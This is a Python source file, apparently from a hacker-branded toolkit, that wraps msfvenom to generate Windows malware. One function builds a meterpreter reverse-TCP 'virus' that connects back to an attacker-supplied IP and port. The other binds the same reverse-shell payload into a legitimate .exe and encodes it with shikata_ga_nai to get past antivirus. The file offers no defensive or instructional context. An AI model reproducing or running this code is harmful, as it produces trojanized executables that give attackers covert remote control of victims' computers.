import os
from assets import *

def win_vir():
    print(werno.biru+'''
     ___    ___
    ( _<    >_ )
    //        ''
    ''___..___// bE rEaDy F0r
     `-(    )-'  tHe D4rknest
       _|__|_    RedBull
      /_|__|_'    
      /_|__|_'
      /_\__/_'
       \ || /  _)
         ||   ( )
         ''___//
          `---'
    '''+werno.biasa)
    load()
    type_buat()
    set_ip = input("your ip local : ")
    set_port = input("your port : ")
    filennya = input("file name : ")
    folder = input("save to folder : ")
    
    if not os.path.exists(folder):
        os.system("mkdir {}".format(folder))
    else:
        load()
    
    h_win = folder+'/'+filennya
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST={} LPORT={} > {} >/dev/null 2>&1".format(set_ip, set_port, h_win))
    if not os.path.exists(h_win):
        print("fail to create virus, check your config")
    else:
        type_sukses()
        print("Your location file : {}".format(os.getcwd()+"/"+h_win))

def bind_win():
    print(werno.ijo+'''
                          .::.
                       .:'  .:
            ,MMM8&&&.:'   .:'
           MMMMM88&&&&  .:'
          MMMMM88&&&&&&:' Keep Clown dan Carry On
          MMMMM88&&&&&&   RedBull
        .:MMMMM88&&&&&&   if your target in another path
      .:'  MMMMM88&&&&    input your target bind using /
    .:'   .:'MMM8&&&'     (example : a/b.exe)
    :'  .:'  
    '::'  
    '''+werno.biasa)
    load()
    ip_l = input("your ip local : ")
    ip_p = input("your port : ")
    sl_file = input("input your file exe target (.exe) : ")
    print("Select your list architecture for encoder")
    os.system("msfconsole -q -x 'use payload/windows/meterpreter/reverse_tcp;show encoders;exit'")
    load()
    arch_file = input("enter your architecture file type : ")
    print("we recomendation to use encoder "+werno.merah_putih+"{}/shikata_ga_nai".format(arch_file)+werno.normal)
    enc_type = input("your encoder type : ")
    out_file = input("filname output : ")
    sv_fldr = input("save to folder : ")

    if not os.path.exists(sv_fldr):
        os.system("mkdir {}".format(sv_fldr))
    elif not os.path.exists(sl_file):
        print("check your path file exe target!")
        return bind_win()
    else:
        load()
    win_hasil = sv_fldr+'/'+out_file
    bind_load()
    os.system("msfvenom -a {} --platform windows -x {} -k -p windows/meterpreter/reverse_tcp lhost={} lport={} -e {} -i 5 -f exe -o {} >/dev/null 2>&1".format(arch_file, sl_file, ip_l, ip_p, enc_type, win_hasil))
    
    if not os.path.exists(win_hasil):
        print("Sorry your exe target not support with payload byte encoder")
        print("fail to bind server, check your config")
        return bind_win()
    else:
        print("Your output: {}\n".format(os.getcwd()+"/"+win_hasil))
    load()